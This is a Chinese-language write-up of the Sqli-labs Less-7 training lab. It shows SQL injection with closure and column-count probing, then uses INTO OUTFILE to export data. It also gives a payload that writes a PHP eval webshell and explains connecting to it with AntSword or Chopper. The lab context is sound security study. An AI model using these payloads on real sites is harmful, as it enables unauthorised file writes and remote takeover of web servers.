---
title: Sqli-labs Less-7 Writeup
date: 2026-11-02
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---

# Sqli-labs Less-7 Writeup
## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，并且页面显示 `use outfile`。与前面关卡不同，Less-7 没有正常的回显位，即使注入成功页面也只会提示 `You have an error in your SQL syntax`。考察 **INTO OUTFILE 文件导出** 与 **布尔盲注**。

## 解题思路
1. 判断闭合方式：输入 `?id=1'` 页面报错，输入 `?id=1'))` 页面正常。根据报错提示，确认闭合符号为 `'))`。语句大概是：`SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1`。
2. 判断字段数：输入 `?id=1')) order by 3 --+` 正常，`?id=1')) order by 4 --+` 报错，确认字段数为 **3**。
3. 尝试使用文件导出：由于页面不回显，尝试利用 `union select` 配合 `INTO OUTFILE` 将结果写入本地文件。
    *   **排错过程**：直接写入报错，原因在于 MySQL 5.7 默认开启了 `secure_file_priv` 限制，禁止写入文件。
    *   **修复配置**：打开 phpStudy (XP.CN) 对应的 MySQL 配置文件 `my.ini`（需以管理员身份编辑），在 `[mysqld]` 下添加 `secure_file_priv=""`，保存并**重启 MySQL 服务**。
4. 重新构造 Payload 导出数据：
    *   构造语句：`?id=-1')) union select 1,2,database() into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/1.txt' --+`
    *   （注：使用 `id=-1` 让前半句查不到数据，确保导出内容纯净；Windows 下路径建议使用正斜杠 `/` 避免转义问题）。
5. 验证结果：虽然浏览器页面依然显示 `You have an error in your SQL syntax`（盲写现象），但直接去本地 `Less-7` 文件夹下，发现成功生成了 `1.txt` 文件，打开内容为 `1 2 security`。

> 知识点：`INTO OUTFILE` 是 SQL 注入中拿 WebShell 的核心手段之一。前提是数据库用户具备 `FILE` 权限，且 `secure_file_priv` 允许写入，同时需要知道网站的绝对物理路径。

## 通关 Payload

### 1. 写入文件获取数据库名
```sql
?id=-1')) union select 1,2,database() into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/1.txt' --+
```
### 2. 进阶：直接写入一句话木马拿权限

```sql
?id=-1')) union select 1,2,"<?php @eval($_POST['cmd']);?>" into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php' --+
```

写入成功后，可通过蚁剑/菜刀连接 shell.php，密码为 cmd。
